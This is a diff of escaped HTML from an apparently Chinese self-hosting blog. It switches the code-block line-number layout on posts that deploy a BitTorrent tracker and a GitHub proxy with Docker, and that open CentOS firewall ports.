+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">docker run --name tracker-server -d -p 6666:6666 -p 6666:6666/udp moerats/tracker-server:latest
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>如果你服务器上的&lt;code>6666&lt;/code>端口正在被使用，而&lt;code>7777&lt;/code>没被使用，那就改成&lt;code>7777:6666&lt;/code>参数后再运行。&lt;/p>
 &lt;p>对于某些系统可能还需要开启防火墙端口，比如CentOS 7，开启命令：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">firewall-cmd --zone&lt;span class="o">=&lt;/span>public --add-port&lt;span class="o">=&lt;/span>6666/tcp --permanent
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">firewall-cmd --zone&lt;span class="o">=&lt;/span>public --add-port&lt;span class="o">=&lt;/span>6666/udp --permanent
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">firewall-cmd --reload
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="使用方法">使用方法&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">firewall-cmd --zone&lt;span class="o">=&lt;/span>public --add-port&lt;span class="o">=&lt;/span>6666/tcp --permanent
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">firewall-cmd --zone&lt;span class="o">=&lt;/span>public --add-port&lt;span class="o">=&lt;/span>6666/udp --permanent
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">firewall-cmd --reload
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="使用方法">使用方法&lt;/h3>
 &lt;p>我们在制作种子添加&lt;code>Tracker&lt;/code>服务器时，可以填：&lt;/p>
 &lt;ol>
 &lt;li>&lt;code>http://IP:6666/announce&lt;/code>&lt;/li>
@@ -1357,11 +1624,21 @@ mkdir /root/adguardhome/confdir
 &lt;p>一台可以无限上网的linux主机，比如国外的服务器，或者阿里云、腾讯云的海外/香港云主机&lt;/p>
 &lt;p>这是必须的前提&lt;/p>
 &lt;h3 id="docker部署">Docker部署&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">docker run -d --name&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;gh-proxy-py&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">2&lt;/span>&lt;span class="cl"> -p 0.0.0.0:9183:9183
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">3&lt;/span>&lt;span class="cl"> --restart&lt;span class="o">=&lt;/span>always
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">4&lt;/span>&lt;span class="cl"> hunsh/gh-proxy-py:latest
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第一个&lt;code>9183&lt;/code>就是需要对外的端口，需要打开或映射出去&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">docker run -d --name&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;gh-proxy-py&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -p 0.0.0.0:9183:9183
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --restart&lt;span class="o">=&lt;/span>always
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> hunsh/gh-proxy-py:latest
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>第一个&lt;code>9183&lt;/code>就是需要对外的端口，需要打开或映射出去&lt;/p>
 &lt;p>完成后可以浏览器打开：服务器地址:端口，如果出现页面，即代表成功&lt;/p>
 &lt;h3 id="如何使用">如何使用&lt;/h3>
 &lt;p>部署成功后就可以使用了，方法也很简单，直接Github地址之前加你的服务器地址：端口（80可以省略）&lt;/p>
